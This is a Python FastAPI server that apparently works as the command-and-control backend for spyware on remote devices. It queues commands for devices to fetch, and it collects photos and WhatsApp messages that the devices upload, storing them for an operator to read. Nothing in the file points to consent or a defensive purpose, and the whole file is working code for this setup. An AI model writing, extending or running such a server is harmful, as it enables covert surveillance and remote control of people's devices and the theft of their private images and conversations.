from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from typing import Dict, List
import json
import os
import base64

app = FastAPI()
API_KEY = "MY_SECRET_KEY_123" 

device_data = {} 
command_queue = []
latest_image_b64 = "" # Holds the latest photo
latest_wa_chats = []  # Holds WhatsApp messages

def check_key(request: Request):
    if request.headers.get("X-Key") != API_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

@app.post("/cmd")
async def get_commands(request: Request):
    check_key(request)
    data = await request.json()
    device_data[data.get("device_id")] = data
    cmds = list(command_queue)
    command_queue.clear()
    return {"commands": cmds}

@app.post("/result")
async def post_result(request: Request):
    global latest_image_b64
    check_key(request)
    data = await request.json()
    
    # If the result contains a photo, save it
    if "image_b64" in data:
        latest_image_b64 = data["image_b64"]
        print("Received new photo from device!")
        
    return {"status": "ok"}

@app.post("/wa")
async def post_wa(request: Request):
    global latest_wa_chats
    check_key(request)
    data = await request.json()
    
    # Add new messages to the front of the list
    if "messages" in data:
        for msg in data["messages"]:
            latest_wa_chats.insert(0, msg)
        # Keep only last 50 messages to save memory
        latest_wa_chats = latest_wa_chats[:50] 
        
    return {"status": "ok"}

@app.get("/state")
async def get_state(request: Request):
    check_key(request)
    return {
        "devices": device_data,
        "latest_image_b64": latest_image_b64,
        "wa_chats": latest_wa_chats
    }

@app.post("/queue_cmd")
async def queue_command(request: Request):
    check_key(request)
    cmd = await request.json()
    command_queue.append(cmd)
    return {"status": "queued"}
